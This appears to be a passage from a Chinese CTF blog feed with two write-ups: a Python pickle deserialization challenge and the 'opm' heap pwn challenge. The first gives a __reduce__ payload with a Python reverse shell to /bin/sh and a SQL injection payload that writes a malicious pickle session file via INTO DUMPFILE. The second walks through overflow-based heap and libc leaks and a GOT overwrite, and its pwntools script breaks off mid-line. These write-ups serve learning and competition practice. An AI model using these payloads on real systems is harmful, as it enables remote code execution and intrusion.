从打开的文件对象中读取pickled对象表现形式并返回通过pickle反序列化后得到的Python对象</span></span><br><span class="line">load(file, *, fix_imports=<span class="keyword">True</span>, encoding=<span class="string">"ASCII"</span>, errors=<span class="string">"strict"</span>)</span><br></pre></td></tr></table></figure></p><blockquote><p>说明： 上面这几个方法参数中，*号后面的参数都是Python 3.x新增的，目的是为了兼容Python 2.x，具体用法请参看官方文档。</p></blockquote><p>基本使用方法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">P = pickle.Pickler(file) <span class="comment">#pickle.dump(object, file)</span></span><br><span class="line">P.dump(object)</span><br><span class="line"></span><br><span class="line">U = pickle.Unpickler(file) <span class="comment">#pickle.load(file)</span></span><br><span class="line">object = U.load()</span><br></pre></td></tr></table></figure></p><h3 id="pickle反序列化漏洞"><a href="#pickle反序列化漏洞" class="headerlink" title="pickle反序列化漏洞"></a>pickle反序列化漏洞</h3><p>python的反序列化漏洞关键在于<strong>reduce</strong> 魔术方法，在反序列化的时候会完全改变被序列化的对象。这个方法返回一个字符串或者元组来描述当反序列化的时候该如何重构，进而造成命令执行。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">"id"</span>,))    </span><br><span class="line"></span><br><span class="line">t = test()</span><br><span class="line"></span><br><span class="line">f1 = open(<span class="string">'p_test'</span>,<span class="string">'wb'</span>)</span><br><span class="line">p = pickle.Pickler(f1)</span><br><span class="line">p.dump(t) <span class="comment">#p = pickle.dump(t, f1)</span></span><br><span class="line">f1.close()</span><br><span class="line"></span><br><span class="line">f2 = open(<span class="string">'p_test'</span>,<span class="string">'rb'</span>)</span><br><span class="line">u = pickle.Unpickler(f2)</span><br><span class="line">u.load() <span class="comment">#u = pickle.load(f2)</span></span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure></p><p>运行效果：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> kira @ Ubuntu in ~/py_web [11:24:46]</span><br><span class="line"><span class="meta">$</span> python p_test.py</span><br><span class="line">uid=1000(kira) gid=1000(kira) groups=1000(kira),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lxd),115(lpadmin),116(sambashare)</span><br></pre></td></tr></table></figure></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>现在重新看看<code>load(file)</code>和<code>loads(str)</code>两个函数，是带有过滤的反序列化，一个用于操作文件，一个用于操作字符串。</p><p>搜索一下，看看代码里面哪里用到这个两个函数，发现在<code>Mycache.py</code>有这个类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class FileSystemCache(BaseCache)</span><br></pre></td></tr></table></figure></p><p>而用到这个类的代码都在<code>Mysession.py</code>这个类，都是对session操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class FileSystemSessionInterface(SessionInterface)</span><br></pre></td></tr></table></figure></p><p>重点留意下<code>open_session()</code>和<code>save_session()</code>，这是反序列化常见套路。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_session</span><span class="params">(self, app, request)</span>:</span></span><br><span class="line">    sid = request.cookies.get(app.session_cookie_name)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sid:</span><br><span class="line">        sid = self._generate_sid()</span><br><span class="line">        <span class="keyword">return</span> self.session_class(sid=sid, permanent=self.permanent)</span><br><span class="line">    <span class="keyword">if</span> self.use_signer:</span><br><span class="line">        signer = self._get_signer(app)</span><br><span class="line">        <span class="keyword">if</span> signer <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sid_as_bytes = signer.unsign(sid)</span><br><span class="line">            sid = sid_as_bytes.decode()</span><br><span class="line">        <span class="keyword">except</span> BadSignature:</span><br><span class="line">            sid = self._generate_sid()</span><br><span class="line">            <span class="keyword">return</span> self.session_class(sid=sid, permanent=self.permanent)</span><br><span class="line">    data = self.cache.get(self.key_prefix + sid)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> self.session_class(data, sid=sid)</span><br><span class="line">    <span class="keyword">return</span> self.session_class(sid=sid, permanent=self.permanent)</span><br></pre></td></tr></table></figure></p><p>留意<code>open_session()</code>中调用了<code>self.cache.get(self.key_prefix + sid)</code>，跟进之<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, key)</span>:</span> <span class="comment"># key = self.key_prefix + sid</span></span><br><span class="line">    filename = self._get_filename(key)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            pickle_time = load(f) <span class="comment">#可能存在反序列化</span></span><br><span class="line">            <span class="keyword">if</span> pickle_time == <span class="number">0</span> <span class="keyword">or</span> pickle_time &gt;= time():</span><br><span class="line">                a = load(f) <span class="comment">#可能存在反序列化</span></span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                os.remove(filename)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">except</span> (IOError, OSError, PickleError):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br></pre></td></tr></table></figure></p><p><code>get</code>中两处地方出现<code>load()</code>，十分可疑。<code>filename = self._get_filename(key)</code>跟进之。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_filename</span><span class="params">(self, key)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(key, text_type):</span><br><span class="line">        key = key.encode(<span class="string">'utf-8'</span>)  <span class="comment"># XXX unicode review</span></span><br><span class="line">    hash = md5(key).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> os.path.join(self._path, hash)</span><br></pre></td></tr></table></figure></p><p>可见<code>filename</code>就是<code>md5(self.key_prefix + sid)</code>，查看代码可发现：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key_prefix=<span class="string">"bdwsessions"</span></span><br><span class="line">sid = request.cookies.get(app.session_cookie_name)</span><br></pre></td></tr></table></figure></p><p>查看页面的cookie：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sid = ca823fed-c8b9-450c-8ec9-fc7626ce8326</span><br><span class="line">md5(&quot;bdwsessionsca823fed-c8b9-450c-8ec9-fc7626ce8326&quot;) = 7d6e204846c11a84ab0bc317eab14411</span><br></pre></td></tr></table></figure></p><p>session存在目录在<code>config.py</code>中就记录，本地验证一下，果然存在。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> kira @ Ubuntu in ~ [14:24:00] C:1</span><br><span class="line"><span class="meta">$</span> ll /tmp/ffff |grep 7d6e204846c11a84ab0bc317eab14411</span><br><span class="line">-rw-rw---- 1 kira kira 254 Apr 15 14:19 7d6e204846c11a84ab0bc317eab14411</span><br></pre></td></tr></table></figure></p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ol><li>本地生成序列化session文件</li><li>跟进session文件名规则计算出文件名</li><li>利用mysql的注入，将文件写入/tmp/ffff目录</li><li>访问index的时，修改自己的session为之前我们定义的值</li><li>触发<code>open_session</code>中的<code>self.cache.get</code>，进行反序列化攻击</li></ol><p>源码还设置了沙箱/黑名单来防止某些函数的执行，首先需要绕过黑名单，观察一下，还有以下不在黑名单中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">subprocess.Popen</span><br><span class="line">subprocess.call</span><br><span class="line">commands</span><br></pre></td></tr></table></figure></p><p>本地监听端口，测试反弹shell<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (commands.getoutput,(<span class="string">"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",9394));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"</span>,)) </span><br><span class="line"></span><br><span class="line">t = test()</span><br><span class="line"></span><br><span class="line">f1 = open(<span class="string">'p_test'</span>,<span class="string">'wb'</span>)</span><br><span class="line">p = pickle.Pickler(f1)</span><br><span class="line">p.dump(t) <span class="comment">#p = pickle.dump(t, f1)</span></span><br><span class="line">f1.close()</span><br><span class="line"></span><br><span class="line">f2 = open(<span class="string">'p_test'</span>,<span class="string">'rb'</span>)</span><br><span class="line">u = pickle.Unpickler(f2)</span><br><span class="line">u.load() <span class="comment">#u = pickle.load(f2)</span></span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure></p><p>为了后续注入，将session内容进行hex编码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f2 = open(<span class="string">'p_test'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="keyword">print</span> f2.read().encode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure></p><p>新的session文件随便修改一下之前的sid<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(&quot;bdwsessionsca823fed-c8b9-450c-8ec9-fc7626ceffff&quot;) = d9e836cec5ab2c715fd4050fdc26bd4b</span><br></pre></td></tr></table></figure></p><p>注入点就用上面提到Email的注入点，构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from user where email = &apos;123&apos;/**/union/**/select/**/0x63636f6d6d616e64730a6765746f75747075740a70300a285327707974686f6e202d63205c27696d706f727420736f636b65742c73756270726f636573732c6f733b733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d293b732e636f6e6e6563742828223132372e302e302e31222c3933393429293b6f732e6475703228732e66696c656e6f28292c30293b206f732e6475703228732e66696c656e6f28292c31293b206f732e6475703228732e66696c656e6f28292c32293b703d73756270726f636573732e63616c6c285b222f62696e2f7368222c222d69225d293b5c27270a70310a7470320a5270330a2e/**/into/**/dumpfile/**/&apos;/tmp/ffff/d9e836cec5ab2c715fd4050fdc26bd4b&apos;#@qq.com&apos;</span><br></pre></td></tr></table></figure></p><p>邮箱地址填入以上payload，点击submit后出现<code>Please use a different email address.</code>即可。</p><p>接着在burp中抓取访问index的包，并修改session为<code>ca823fed-c8b9-450c-8ec9-fc7626ceffff</code>，在自己的vps上监听对应的端口。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文纯属抄袭，如有改动，纯属手残。&lt;/p&gt;
&lt;p&gt;原writeup见：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://skysec.top/2018/04/01/Python-is-the-best-language/#%E6%BA%90%E7%A0%81%E7%BB%93
      
    
    </summary>
    
    
      <category term="web" scheme="https://4f-kira.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>qwb-pwn-opm</title>
    <link href="https://4f-kira.github.io/2018/04/12/qwb-pwn-opm/"/>
    <id>https://4f-kira.github.io/2018/04/12/qwb-pwn-opm/</id>
    <published>2018-04-12T08:33:24.000Z</published>
    <updated>2018-04-12T08:35:00.146Z</updated>
    
    <content type="html"><![CDATA[<h3 id="opm"><a href="#opm" class="headerlink" title="opm"></a>opm</h3><p>首先学习一下在IDA创建结构体，<a href="https://blog.csdn.net/hgy413/article/details/7104304" target="_blank" rel="noopener">https://blog.csdn.net/hgy413/article/details/7104304</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00000000 role            struc ; (sizeof=0x20, mappedto_6)</span><br><span class="line">00000000 func            dq ?</span><br><span class="line">00000008 name            dq ?</span><br><span class="line">00000010 length          dq ?</span><br><span class="line">00000018 punch_num       dq ?</span><br><span class="line">00000020 role            ends</span><br></pre></td></tr></table></figure><p>按y重新设置类型后，add_role()伪代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">role *<span class="title">add_role</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  role *v0; <span class="comment">// rbx</span></span><br><span class="line">  role *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  role *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-1A0h]</span></span><br><span class="line">  role *v6; <span class="comment">// [rsp+80h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// [rsp+100h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+188h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = (role *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  sub_56544D04DE2C((__int64)v0);                <span class="comment">// 初始化结构体</span></span><br><span class="line">  v6 = v0;</span><br><span class="line">  v0-&gt;func = (__int64)show;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your name:"</span>);</span><br><span class="line">  gets(&amp;s);                                     <span class="comment">// 溢出点</span></span><br><span class="line">  v1 = v6;</span><br><span class="line">  v1-&gt;length = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  v7 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v2);</span><br><span class="line">  <span class="built_in">strcpy</span>(v7, &amp;s);</span><br><span class="line">  v6-&gt;name = (__int64)v7;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"N punch?"</span>);</span><br><span class="line">  gets(&amp;s);                                     <span class="comment">// 溢出点</span></span><br><span class="line">  v3 = v6;</span><br><span class="line">  LODWORD(v3-&gt;punch_num) = atoi(&amp;s);</span><br><span class="line">  show((__int64)v6);</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思路：gets可以覆盖v6（注意gets会在末位加上’\x00’），第一个溢出点可以改变结构体存放的地址，第二溢出点可以用于泄露地址。</p><p><strong>具体利用过程</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'A'</span>*<span class="number">0x70</span>,<span class="number">1</span>)  <span class="comment">#padding</span></span><br><span class="line">add(<span class="string">'B'</span>*<span class="number">0x80</span>+<span class="string">"\x10"</span>,<span class="number">2</span>) <span class="comment">#role1</span></span><br><span class="line">add(<span class="string">'C'</span>*<span class="number">0x80</span>,<span class="string">'3'</span>+<span class="string">'D'</span>*<span class="number">0x7f</span>+<span class="string">'\x10'</span>) <span class="comment">#role2</span></span><br></pre></td></tr></table></figure><p>程序在heap上会有个很大的chunk，所以覆盖v6的最低位，或者倒数第二为\x00，指针仍然在heap上。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x5603fb8e5000</span><br><span class="line">0x5603fb8e5000:0x00000000000000000x0000000000011c11</span><br><span class="line">0x5603fb8e5010:0x0000000000011c000x0000000000000000</span><br></pre></td></tr></table></figure></p><p>首先正常创建一个role0（用来调整堆的位置，让role1-&gt;name在可控范围范围内）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x55877d5ee000+0x11c10</span><br><span class="line">0x55877d5ffc10:0x00000000000000000x0000000000000031</span><br><span class="line">0x55877d5ffc20:0x000055877c368b30-&gt;func0x000055877d5ffc50-&gt;name</span><br><span class="line">0x55877d5ffc30:0x0000000000000070-&gt;len 0x0000000000000001-&gt;punch</span><br><span class="line">0x55877d5ffc40:0x00000000000000000x0000000000000081</span><br><span class="line">0x55877d5ffc50:0x41414141414141410x4141414141414141-&gt;存放name的chunk</span><br><span class="line">0x55877d5ffc60:0x41414141414141410x4141414141414141</span><br></pre></td></tr></table></figure></p><p>然后创建一个role1，输入name的时候v6被覆盖成<code>xxxx0010</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4gx 0x55877c56a0e0</span><br><span class="line">0x55877c56a0e0:0x000055877d5ffc20-&gt;role00x000055877d5f0010-&gt;role1</span><br><span class="line">0x55877c56a0f0:0x000055877d5f0010-&gt;role20x0000000000000000</span><br></pre></td></tr></table></figure><p>由于v6被覆盖，只有func存到正确位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x55877d5ffcc0:0x00000000000000000x0000000000000031</span><br><span class="line">0x55877d5ffcd0:0x000055877c368b30-&gt;func0x0000000000000000</span><br><span class="line">0x55877d5ffce0:0x0000000000000000        0x0000000000000000</span><br><span class="line">0x55877d5ffcf0:0x00000000000000000x0000000000000091</span><br><span class="line">0x55877d5ffd00:0x42424242424242420x4242424242424242-&gt;存放name的chunk</span><br><span class="line">0x55877d5ffd10:0x42424242424242420x4242424242424242</span><br></pre></td></tr></table></figure></p><p>其余部分存放到<code>0x000055877d5f0010</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x000055877d5f0010</span><br><span class="line">0x55877d5f0010:0x00000000000000000x000055877d5ffd00-&gt;name</span><br><span class="line">0x55877d5f0020:0x00000000000000810x0000000000000003</span><br></pre></td></tr></table></figure></p><p>创建一个role2，第一次溢出覆盖v6最低位为<code>xxxxxx00</code>，本来应为<code>0x55877d5ffd90</code>，变成了<code>0x55877d5ffd00</code>，而这个地址是role1存放name的chunk。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x55877d5ffd80:0x00000000000000100x0000000000000031</span><br><span class="line">0x55877d5ffd90:0x000055877c368b300x0000000000000000</span><br><span class="line">0x55877d5ffda0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55877d5ffdb0:0x00000000000000000x0000000000000091</span><br><span class="line">0x55877d5ffdc0:0x43434343434343430x4343434343434343-&gt;name</span><br><span class="line">0x55877d5ffdd0:0x43434343434343430x4343434343434343</span><br></pre></td></tr></table></figure></p><p>重新查看role1的heap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x55877d5ffd00:0x42424242424242420x000055877d5ffdc0-&gt;role1的name地址</span><br><span class="line">0x55877d5ffd10:0x00000000000000800x4242424242424242</span><br></pre></td></tr></table></figure></p><p>第二次溢出覆盖v6最低位为<code>xxxx0010</code>，那么v6变成<code>0x000055877d5f0010</code>，这个地址是role1的地址，函数结束时候show就会把role1-&gt;name打印出来，此时role-&gt;name有heap的地址。</p><p>有了heap地址，就可以伪造role泄露函数地址，<code>0x000055877d5ffdc0-0x30</code>就是role2-&gt;func的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(&apos;E&apos;*8+p64(heap-0x30),str(131441).ljust(0x80,&apos;F&apos;)+p64(heap+0xc0))</span><br></pre></td></tr></table></figure><p>创建一个role3，利用role3-&gt;name进行伪造role，role3-&gt;name[0]当作func，role3-&gt;name[1]填入role2-&gt;func的地址<code>0x000055877d5ffdc0-0x30</code>，在第二个溢出点修改v6为fake role的地址<code>0x000055877d5ffdc0+0xc0</code>，由于punch num的输入会破坏top chunk，所以需要计算此时正确的数值，并输入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原来top chunk:0x201c1</span><br><span class="line">新建role3后申请了0x30+0x20的空间</span><br><span class="line">此时top chunk:0x201c1-0x50 = 0x20171 = 131441</span><br></pre></td></tr></table></figure></p><p>完成role3创建后heap结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/64gx 0x55877d5ffd80</span><br><span class="line">0x55877d5ffd80:0x00000000000000100x0000000000000031 ----&gt;role2</span><br><span class="line">0x55877d5ffd90:0x000055877c368b300x0000000000000000</span><br><span class="line">0x55877d5ffda0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55877d5ffdb0:0x00000000000000000x0000000000000091</span><br><span class="line">0x55877d5ffdc0:0x43434343434343430x4343434343434343 ----&gt;role2-&gt;name</span><br><span class="line">0x55877d5ffdd0:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffde0:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffdf0:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe00:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe10:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe20:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe30:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe40:0x00000000000000000x0000000000000031 ----&gt;role3</span><br><span class="line">0x55877d5ffe50:0x000055877c368b300x000055877d5ffe80</span><br><span class="line">0x55877d5ffe60:0x000000000000000e0x0000000000000000</span><br><span class="line">0x55877d5ffe70:0x00000000000000000x0000000000000021</span><br><span class="line">0x55877d5ffe80:0x45454545454545450x000055877d5ffd90 ----&gt;role3-&gt;name # fake role</span><br><span class="line">0x55877d5ffe90:0x00000000000000000x0000000000020171 ----&gt;top chunk</span><br></pre></td></tr></table></figure></p><p>同理可以泄漏libc地址，然后利用第二个溢出点覆盖v6为strlen@got地址，通过写入punch num修改低8位地址为system地址或者onegadget地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./opm'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,n)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'(E)'</span>,<span class="string">'A'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line">    p.recvuntil(<span class="string">'punch?'</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">    p.sendline(str(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'(E)'</span>,<span class="string">'S'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./opm'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">add(<span class="string">'A'</span>*<span 